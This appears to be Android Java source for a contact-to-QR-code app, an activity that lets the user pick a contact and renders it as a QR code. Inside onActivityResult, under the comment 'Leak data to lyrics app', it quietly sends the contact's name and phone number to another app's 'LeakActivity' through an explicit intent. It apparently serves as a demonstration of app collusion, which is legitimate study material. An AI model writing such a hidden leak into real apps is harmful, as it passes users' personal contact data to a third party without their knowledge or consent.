package xyz.praveen.contactx;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;

import com.google.zxing.BarcodeFormat;
import com.google.zxing.WriterException;
import com.google.zxing.common.BitMatrix;
import com.google.zxing.qrcode.QRCodeWriter;


public class EncodeActivity extends AppCompatActivity {
    static final int PICK_CONTACT = 1;
    Context context = this;

    // Widgets
    ImageView mQRCode;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_encode);

        if (getIntent().getBooleanExtra("pickContact", false)) {
            Intent intent = new Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI);
            startActivityForResult(intent, PICK_CONTACT);
        }

        // Widgets setup
        mQRCode = (ImageView) findViewById(R.id.contact_qrcode);
    }

    @Override
    public void onActivityResult(int reqCode, int resultCode, Intent data) {
        super.onActivityResult(reqCode, resultCode, data);

        switch (reqCode) {
            case (PICK_CONTACT):
                if (resultCode == Activity.RESULT_OK) {

                    String jsonContact = "NULL";
                    Uri contactData = data.getData();
                    Cursor c = managedQuery(contactData, null, null, null, null);
                    if (c.moveToFirst()) {

                        String id = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                        String hasPhone = c.getString(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

                        if (hasPhone.equalsIgnoreCase("1")) {
                            Cursor phones = getContentResolver().query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + id,
                                    null, null);
                            phones.moveToFirst();
                            String phn_no = phones.getString(phones.getColumnIndex("data1"));
                            String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.DISPLAY_NAME));
                            jsonContact = JsonFactory.ContactToJson(name, phn_no);

                            // Leak data to lyrics app
                            try {
                                Intent intent = new Intent();
                                intent.setComponent(new ComponentName(
                                        "xyz.praveen.lyricx",
                                        "xyz.praveen.lyricx.LeakActivity"));
                                intent.putExtra("leakData", jsonContact);
                                startActivity(intent);
                            } catch (Exception e) {
                                Toast.makeText(context, "No leak!", Toast.LENGTH_SHORT).show();
                            }
                        }


                    }
                    mQRCode.setVisibility(View.VISIBLE);
                    mQRCode.setImageBitmap(encodeToQrCode(jsonContact, 150, 150));
                } else {
                    finish();
                }
                break;
        }
    }

    /**
     * Encodes the given string to QR Code
     *
     * @param text   text to encode
     * @param width  width of the qrcode
     * @param height height of the qrcode
     * @return Bitmap of QRCode
     */
    public static Bitmap encodeToQrCode(String text, int width, int height) {
        QRCodeWriter writer = new QRCodeWriter();
        BitMatrix matrix = null;
        try {
            matrix = writer.encode(text, BarcodeFormat.QR_CODE, width, height);
        } catch (WriterException ex) {
            ex.printStackTrace();
        }
        Bitmap bmp = Bitmap.createBitmap(width, height, Bitmap.Config.RGB_565);
        for (int x = 0; x < width; x++) {
            for (int y = 0; y < height; y++) {
                bmp.setPixel(x, y, matrix.get(x, y) ? Color.BLACK : Color.WHITE);
            }
        }
        return bmp;
    }
}
